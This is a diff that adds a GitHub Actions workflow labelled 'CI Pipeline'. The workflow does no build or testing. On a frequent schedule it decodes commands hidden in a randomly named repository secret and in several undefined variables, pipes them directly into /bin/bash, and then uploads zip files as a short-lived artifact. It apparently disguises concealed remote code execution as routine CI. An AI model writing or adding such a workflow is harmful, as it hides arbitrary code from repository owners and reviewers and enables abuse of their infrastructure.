@@ -1,0 +1,30 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 1,7,13,19 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Execute
+        env:
+          veukw305: ${{ secrets.veukw305 }}
+        run: |
+          printf '%s' "$veukw305" | jq -r .sju9644 | /bin/bash
+          echo $fgnz27661 | jq -r .rsdp264 | /bin/bash
+          echo $tbrvu3835 | jq -r .mgmo7846 | /bin/bash
+          printf '%s' "$tpql19469" | jq -r .tezi1 | /bin/bash
+          printf '%s' "$fxes3" | jq -r .v6658 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: MJgMw8KJ
+          path: "*.zip"
+          retention-days: 1
